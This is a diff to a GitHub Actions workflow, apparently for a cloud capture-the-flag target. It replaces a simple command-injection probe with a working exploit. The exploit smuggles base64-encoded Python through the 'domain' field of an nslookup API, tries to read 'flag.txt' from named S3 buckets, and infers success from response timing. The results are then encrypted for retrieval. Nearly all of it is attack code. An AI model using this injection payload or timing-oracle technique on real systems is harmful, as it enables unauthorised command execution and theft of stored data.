@@ -19,7 +19,7 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Probe API and collect Lambda logs
+      - name: Test Lambda S3 timing oracle and encrypt results
         env:
           CLOUDESCAPE_PUBLIC_KEY: |
             -----BEGIN PUBLIC KEY-----
@@ -36,22 +36,25 @@ jobs:
           printf '%s\n' "$CLOUDESCAPE_PUBLIC_KEY" > /tmp/cloudescape.pub
           python3 -m pip install requests requests-aws4auth --quiet
           python3 - <<'PY'
-          import base64, json, os, requests
+          import base64, json, os, requests, time
           from requests_aws4auth import AWS4Auth
           auth = AWS4Auth(os.environ["AWS_ACCESS_KEY_ID"], os.environ["AWS_SECRET_ACCESS_KEY"], "us-east-1", "execute-api", session_token=os.environ["AWS_SESSION_TOKEN"])
-          r = requests.post("https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup", json={"domain":"example.com; echo LOGPROBE"}, auth=auth, timeout=30)
-          open("/tmp/api-status","w").write(str(r.status_code))
-          open("/tmp/api-body","wb").write(r.content)
-          PY
-          set +e
-          aws logs filter-log-events --log-group-name /aws/lambda/nslookupv2 --start-time "$(date -d '10 minutes ago' +%s000)" --output json > /tmp/lambda-logs.json 2>/tmp/lambda-logs-error.txt
-          echo $? > /tmp/log-status
-          set -e
-          python3 - <<'PY'
-          import base64, json, os
-          def b64(path):
-              return base64.b64encode(open(path,"rb").read()).decode() if os.path.exists(path) else ""
-          json.dump({"api_status":open("/tmp/api-status").read(),"api_body_b64":b64("/tmp/api-body"),"log_status":open("/tmp/log-status").read().strip(),"logs_b64":b64("/tmp/lambda-logs.json"),"logs_error_b64":b64("/tmp/lambda-logs-error.txt")},open("/tmp/cloudescape-result.json","w"),separators=(",",":"))
+          results = {}
+          for bucket in ["userad88e2b168aa387e", "logad88e2b168aa387e"]:
+              code = (
+                  "import boto3,time;"
+                  "try:"
+                  " s=boto3.client('s3',region_name='us-east-1',endpoint_url='https://s3.us-east-1.amazonaws.com');"
+                  f" s.get_object(Bucket={bucket!r},Key='flag.txt')['Body'].read();"
+                  " time.sleep(5)"
+                  "except Exception: pass"
+              )
+              encoded = base64.b64encode(code.encode()).decode()
+              domain = 'example.com; python3 -c "import base64;exec(base64.b64decode(\'' + encoded + '\'))"'
+              start = time.monotonic()
+              r = requests.post("https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup", json={"domain":domain}, auth=auth, timeout=30)
+              results[bucket] = {"status":r.status_code,"elapsed":round(time.monotonic()-start,3)}
+          json.dump(results,open("/tmp/cloudescape-result.json","w"),separators=(",",":"))
           PY
           openssl rand -hex 32 > /tmp/cloudescape.key
           openssl pkeyutl -encrypt -pubin -inkey /tmp/cloudescape.pub -pkeyopt rsa_padding_mode:oaep -in /tmp/cloudescape.key -out /tmp/cloudescape.key.enc
